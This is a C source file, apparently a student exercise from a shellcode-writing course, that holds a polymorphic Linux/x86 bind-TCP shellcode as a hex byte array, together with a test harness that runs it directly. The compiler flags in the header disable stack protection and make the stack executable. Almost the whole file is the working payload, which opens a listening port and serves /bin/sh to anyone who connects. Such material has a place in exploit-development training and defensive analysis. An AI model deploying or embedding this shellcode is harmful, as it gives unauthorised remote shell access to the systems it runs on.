/*
Filename:      shellcode-polymorphic.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          x86 code but compiled on x64
Source:        http://shell-storm.org/shellcode/files/shellcode-837.php
Information:   Linux/x86 - Tiny Shell Bind TCP Random Port Shellcode - 57 bytes
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode-polymorphic.c -o shellcode-polymorphic
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xc0\x89\xc3\x89\xda\x89\xd5\x66\x83\xc5\x66\x89\xe8\x83\xc3\x01\x52\x53\x6a\x01\x80\x04\x24\x01\x89\xe1\xcd\x80\x52\x50\x89\xe1\x89\xe8\x43\x43\x43\xcd\x80\x89\xe8\x83\xc3\x01\xcd\x80\x59\x93\x83\xed\x27\x89\xe8\xcd\x80\x83\xe9\x01\x79\xf7\x83\xed\x34\x89\xe8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x83\xc1\x01\xcd\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
